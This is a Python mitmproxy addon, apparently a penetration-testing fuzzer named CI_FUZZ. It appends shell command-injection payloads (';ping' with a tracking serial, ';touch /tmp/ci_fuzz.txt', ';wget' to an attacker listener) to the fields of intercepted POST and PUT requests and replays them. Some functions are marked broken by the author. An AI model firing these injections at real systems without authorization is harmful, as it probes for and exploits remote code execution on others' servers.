'''
CI_FUZZ     v.2018-Jan-3
   _____ _____    ______             
  / ____|_   _|  |  ____|            
 | |      | |    | |__ _   _ ________
 | |      | |    |  __| | | |_  /_  /
 | |____ _| |_   | |  | |_| |/ / / / 
  \_____|_____|  |_|   \__,_/___/___|
                                                
'''

from mitmproxy import http    	#Request/Response intercepting
from mitmproxy import ctx    	#Logging to builtin events
import json      		#For json manipulation
import re			#For regex
from time import sleep		#for delay between replays
import socket			#For sniffing icmp/detection
#import binascii		#For sniffing and serialization

##############################################
#BEGIN CONFIGURATION SECTION
#set the Command Injection payload below.  It will be added to each argument's value in the body (ie: ";ping -c 1 10.10.10.10")
payload = ";ping -s 14 -c 1 -p "  #Don't forget to run python icmp.py separately to listen for pings on attacker's IP!!
#payload = ";touch /tmp/ci_fuzz.txt"  #Don't forget to watch for new files in the victim's directory!! (ie: watch ls /tmp/ci_fuzz.txt)
#payload = ";wget 10.10.10.10:80/ci_fuzz --no-proxy&"   #Don't forget to setup an http listener on attacker's IP!! (ie: python -m SimpleHTTPServer 80)

#Optional Configuration
cust_header = "CI_FUZZ"       #Custom Header for all modified requests
skip_content = [{"dont_want_to_test": "true"}]   #Content to skip if matches BODY exactly - keep in list format]
skip_keyword = "password"    #a keyword to skip fuzzing if BODY contains that keyword. useful for login/passwords,etc
delay = .1 #set delay in seconds between replays (ie: .1 is 1/10 of a second between each new injection attempt)
method_type = ["POST","PUT"]      #Set what HTTP methods are triggered (ie:  "POST", "PUT", etc..)
host_allow = ["192.168.1.254","192.168.1.171","127.0.0.1"]  #Set what HOSTs we want to fuzz on (ip or hostname only)
target = socket.gethostbyname(socket.gethostname()) #Can be set to something else if preferred, but this script will not detect icmp)
serial_int = 1   #starting serial number for tracking
#END CONFIGURATION SECTION
##############################################

'''
#BUG TODO  This part is theory to listen for ping back and get the "serial" number back. probably needs threading,etc
#Workaround for now - run python icmp.py separately
sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
sock.bind((target, 0))
try:
    while True:
        #Looking for icmp similiar to result of ping -s 15 -c 1 -p 020000000000000000000000000001 192.168.86.37 (size 15)
        data = sock.recv(43) #RFC says ICMP should <= 65507 = (65535 - 20 - 8).  fuzzer's size will be <=42 = (15+20+8)
        ip_header = data[:20]  #ip header supposed to be first 20 bytes
        data_spot = len(data)-28
        contents = data[-data_spot:]
        #contents_str = [ord(c) for c in contents]
        ips = ip_header[-8:-4]
        source = '%i.%i.%i.%i' % (ord(ips[0]), ord(ips[1]), ord(ips[2]), ord(ips[3]))
        ctx.log.error("Ping from %s - data ->%s" % (source, binascii.b2a_hex(contents)))
except KeyboardInterrupt:
    ctx.log.error("Closing")
'''

ctx.log.error("Starting CI_FUZZ......")
ctx.log.error("Fuzzing on host->%s with HTTP-type(s) of->%s" % (host_allow,method_type))

def modify_list(webapp_content,flow):    #BROKEN Function
    global serial_int #TODO  make sure this is properly "shared" between types
    #???maybe remove?? webapp_content_list = webapp_content.decode("utf-8")
    for vara in webapp_content_list:
        for attribute, value in vara.iteritems():
          if isinstance (value, (unicode)):
            value_new = str(value)
            value_new += payload
            webapp_content_list.remove(vara)
            vara[(attribute)] = value_new
            webapp_content_list.append(vara)
            send_modified_request(webapp_content_list,flow)
            webapp_content_list.remove(vara)
            vara[(attribute)] = value
            webapp_content_list.append(vara)
          if isinstance (value, (list, dict, bool, type(None), type(int))):    #Removed integer for now
            ctx.log.error("TODO!!-MODIFY_LIST Complex LIST - the first LIST value is NOT unicode - skipping->%s of type->%s. " % (webapp_content,type(value)))
          else:
            #ctx.log.error("ERROR/BUG!! - in Modify_DICT this is a value the developer has never seen->%s of type %s." % (value, type(value)))
            pass

def modify_json(webapp_content,flow):
    global serial_int #TODO  make sure this is properly "shared" between types
    webapp_content_json = json.loads(webapp_content)
    #ctx.log.error("DEBUG5.0-MODIFY_DICT-CONTINUE-modifing dict")
    for attribute, value in webapp_content_json.items():
        #ctx.log.error("DEBUG5.1-MODIFY_DICT-Continue-")
        if isinstance (value, (str)):
          serial_hex = serialize(serial_int)
          value_new = str(value)
          value_new += payload + serial_hex + " " + target
          serial_int += 1
          webapp_content_json[(attribute)] = value_new
          send_modified_dict_request(webapp_content_json,flow)
          webapp_content_json[(attribute)] = value
        if isinstance (value, (list, dict, bool, type(None), type(int))):    #Removed integer for now
          ctx.log.error("TODO!!-MODIFY_DICT Complex JSON - the first json value is NOT a string - skipping->%s of type->%s. " % (webapp_content,type(value)))
          pass
        else:
          #ctx.log.error("ERROR/BUG!! - in Modify_DICT this is a value the developer has never seen->%s of type %s." % (value, type(value)))
          pass

def modify_string(webapp_content,flow):
    global serial_int
    #ctx.log.error("DEBUG4.0-MODIFY_STRING-CONTINUE-modifing ")
    webapp_content_str = webapp_content.decode("utf-8")
    webapp_content_str_split = re.split('\&',webapp_content_str)
    #ctx.log.error("DEBUG4.1-MODIFY STRING-split is this->%s." % (webapp_content_str_split))
    for att_val in webapp_content_str_split:
        #TODO -- may need if statement to deal with strings or other things like dates that break (ex: address=2017-12-20+23%3A39%3A07)
        serial_hex = serialize(serial_int)
        att_val_split = re.split('=',att_val)
        value_new = str(att_val_split[1])
        value_new += payload + serial_hex + " " + target
        serial_int += 1
        att_val_new = str(att_val_split[0])
        att_val_new += "="
        att_val_new += value_new
        webapp_content_str_new = re.sub(str(att_val),str(att_val_new),str(webapp_content_str))
        #ctx.log.error("DEBUG4.2-MODIFY STRING-injected payload->%s." % (webapp_content_str_new))
        send_modified_string_request(webapp_content_str_new,flow)

def serialize(serial_int):
    serial_hex = hex(serial_int)[2:]  #remove 0x in front 
    while len(serial_hex) <= 27:
        serial_hex = serial_hex[:0] + '0' + serial_hex[0:]   #pad for 14 bytes total
    #ctx.log.error("DEBUG-SERIALIZE final serial_int->%s   serial_hex->%s" % (serial_int,serial_hex))
    return serial_hex

def check_body_type(webapp_content):
    webapp_content = webapp_content.decode("utf-8")
    if re.match('[.*.]', str(webapp_content)):
      #ctx.log.error("BODY is LIST")
      body_type = "list"
    elif re.match('{.*.}', str(webapp_content)):
      #ctx.log.error("BODY is JSON")
      body_type = "json" 
    elif re.match('.*\=.*.\&.*', str(webapp_content)):
      #ctx.log.error("BODY is STRING")
      body_type = "string"
    elif re.match('XXXXXXXXXXXXXXXX', str(webapp_content)):  #Holder for any other string-type format to process
      #ctx.log.error("BODY is STRING")
      body_type = "string"
    else:
      ctx.log.error("TODO- Unrecognized BODY->%s" % (webapp_content))
      body_type = "unknown"
    return body_type

def check_whitelist(flow,method_type,host_allow,skip_content):
    proceed = False
    if flow.request.method in method_type and flow.request.host in host_allow and flow.request.content and flow.request.content not in skip_content:  #make sure 1)method_type 2)host_allow and 3)body is not blank 4)not already done (skip_content)
        proceed = True 
    else:
        proceed = False
    return proceed

def check_content(webapp_content,payload,skip_keyword):
    if not re.findall(payload,str(webapp_content)) and not re.findall(skip_keyword,str(webapp_content)):   #make sure 1)payload 2)skip_keyword value is NOT found within BODY
        proceed = True
    else:
        proceed = False
    return proceed

def request(flow: http.HTTPFlow) -> None:
    #ctx.log.error("DEBUG1.0-REQ-Continue-a Request")
    proceed = check_whitelist(flow,method_type,host_allow,skip_content)   #TODO Add URL ,etc later for Whitelist
    if proceed == True:
        webapp_content = flow.request.content
        skip_content.append(webapp_content)  #adds to skip_content list to not repeat exact body in the future
        #ctx.log.error("DEBUG1.1-REQ-value of content is ->%s and type is->%s" % (webapp_content,type(webapp_content)))
        proceed = check_content(webapp_content,payload,skip_keyword)
        if proceed == True:
            body_type = check_body_type(webapp_content)
            if body_type == "list":  
                #ctx.log.error("DEBUG2.1-REQ-Continue-is list->%s." % (webapp_content))
                #modify_list(webapp_content,flow)
                ctx.log.error("TODO--need to process LISTS now")
            if body_type == "json":   #BODY is dict/jso  (Used to use if isinstance(webapp_content, dict)
                #ctx.log.error("DEBUG2.2-REQ-Continue-is dict ->%s." % (webapp_content))
                modify_json(webapp_content,flow)
            if body_type == "string":
                #ctx.log.error("DEBUG2.3-REQ-Continue-is string ->%s." % (webapp_content))
                modify_string(webapp_content,flow)
            if body_type == "unknown":
                ctx.log.error("DEBUG2.4-REQ-Stopping - unknown body format to CI_FUZZ")
                pass
            else:
                pass
        else: #BAD/BLANK content - skipping
            pass
    else: #HTTP to be skipped not in WHITELIST 
        pass


def send_modified_string_request(webapp_content,flow):
    global serial_int
    #ctx.log.error("DEBUG7.0-SEND_MODIFIED_STRING is->%s." % (webapp_content))
    f = flow.copy()
    f.request.headers[cust_header] = "true"
    f.request.content = str.encode(webapp_content)
    ctx.master.replay_request(f)
    ctx.log.error("DEBUG7.1-FINAL-SEND_MODIFIED_STRING-sent->%s." % (f.request.content))
    sleep(delay)


def send_modified_dict_request(webapp_content_json_dict,flow):
    #ctx.log.error("DEBUG8.0-SEND_MODIFIED-JSON is->%s." % (webapp_content_json_dict))
    webapp_content = json.dumps(webapp_content_json_dict)
    f = flow.copy()
    f.request.headers[cust_header] = "true"
    f.request.content = str.encode(webapp_content)
    ctx.master.replay_request(f) 
    ctx.log.error("DEBUG8.1-FINAL-SEND_MODIFIED-sent->%s." % (f.request.content))
    sleep(delay)


